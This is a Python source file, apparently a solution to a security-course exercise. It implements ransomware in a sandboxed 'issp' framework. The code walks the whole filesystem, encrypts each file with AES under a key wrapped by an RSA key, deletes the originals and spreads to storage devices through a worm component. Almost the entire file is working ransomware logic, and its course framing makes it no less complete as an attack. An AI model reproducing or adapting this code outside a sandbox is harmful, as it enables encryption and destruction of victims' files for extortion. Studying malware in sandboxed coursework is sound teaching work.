# Implement a ransomware that encrypts all files on the system and propagates itself
# to the root directory and to all storage devices. Directives:
#
# - Encryption should be done using AES with a randomly generated key that is encrypted
#   using the attacker's public RSA key.
# - The attacker's public and private RSA keys should be logged to the console to
#   allow file decryption using the "utils/decrypt_fs.py" script.
#   Note that in a real scenario the attacker would, of course, keep the private key secret
#   and only ship the public key with the malware.
# - The encrypted AES key should be stored in a "key" file in the root directory of the sandbox.
# - Encrypted files should have the ".encrypted" extension.
#
# Note: follow the instructions in "utils/create_fs.py"

import os

from issp import AES, RSA, Malware, Path, Payload, StorageWorm, System, log


class Ransomware(Payload):
    def execute(self, system: System) -> None:
        key_path = system.path("/key")

        if key_path.exists():
            log.info("System already infected")
            return

        key = self._generate_key(key_path)
        encryptor = AES(key)

        for path in system.path("/").walk():
            if path not in (system.own_path, key_path) and path.is_file():
                log.info("Encrypting: %s", path)
                data = path.read_bytes()
                enc_path = system.path(str(path) + ".encrypted")
                enc_path.write_bytes(encryptor.encrypt(data))
                path.remove()

    def _generate_key(self, path: Path) -> bytes:
        rsa = RSA()
        log.info("Attacker public key: %s", rsa.public_key)
        log.info("Attacker private key: %s", rsa.private_key)
        key = os.urandom(32)
        path.write_bytes(rsa.encrypt(key))
        return key


def main() -> None:
    malware = Malware(payload=Ransomware(), propagation=StorageWorm())
    malware.execute()


if __name__ == "__main__":
    main()
